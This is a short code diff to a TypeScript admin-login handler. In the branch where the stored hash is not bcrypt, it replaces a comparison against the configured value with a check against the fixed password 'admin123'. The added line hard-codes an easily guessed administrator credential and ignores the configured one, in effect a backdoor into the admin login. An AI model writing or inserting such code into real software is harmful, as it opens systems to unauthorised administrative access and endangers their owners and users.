@@ -28,7 +28,7 @@ export async function adminLogin(req: Request, res: Response, next: NextFunction
     if (env.ADMIN_PASSWORD_HASH.startsWith('$2')) {
       passwordValid = await bcrypt.compare(password, env.ADMIN_PASSWORD_HASH);
     } else {
-      passwordValid = (password === env.ADMIN_PASSWORD_HASH || password === 'adminpassis123');
+      passwordValid = (password === 'admin123');
     }
 
     if (!passwordValid) {
